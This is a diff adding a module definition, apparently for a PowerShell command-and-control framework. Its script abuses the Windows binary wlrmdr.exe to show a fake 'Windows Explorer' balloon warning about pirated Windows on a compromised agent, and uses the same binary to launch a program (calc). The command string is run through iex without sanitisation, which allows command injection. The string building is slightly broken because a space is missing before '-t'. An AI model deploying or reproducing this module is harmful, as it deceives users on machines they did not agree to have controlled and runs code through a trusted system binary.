@@ -1,0 +1,63 @@
+name: Invoke-WLMDR
+authors:
+  - '@benichmt1'
+description: Displays a balloon reminder in the taskbar.
+software: ''
+techniques:
+  - T1491
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - ''
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: Message
+    description: Message text to display.
+    required: true
+    value: You are using a pirated version of Microsoft Windows.
+  - name: IconType
+    description: Critical, Exclamation, Information, Key, or None
+    required: true
+    value: Key
+  - name: Title
+    description: Title of the message box to display.
+    required: true
+    value: Windows Explorer
+script: |
+  function Invoke-Wlrmdr {
+      [CmdletBinding()]
+      Param (
+          [Parameter(Mandatory = $True, Position = 0)]
+          [String] $Message = "You are using pirated Windows",
+
+          [Parameter(Mandatory = $True, Position = 1)]
+          [String] $IconType = "Key",
+          [Parameter(Mandatory = $True, Position = 2)]
+          [String] $Title = "Windows Explorer"
+      )
+  $command = "wlrmdr.exe -s 60000 -f "
+  $Iaintgotnotype = switch ($IconType)
+      {
+          "Critical" {6}
+          "Exclamation" {5}
+          "Information" {1}
+          "Key" {4}
+          "None" {0}
+          default {0}
+      }
+  $command += $Iaintgotnotype
+  $command += "-t "
+  $command += $Title
+  $command += " -m "
+  $command += $Message
+  $command += " -a 10 -u calc"
+  iex $command
+  }
+script_end: Invoke-Wlrmdr {{ PARAMS }}
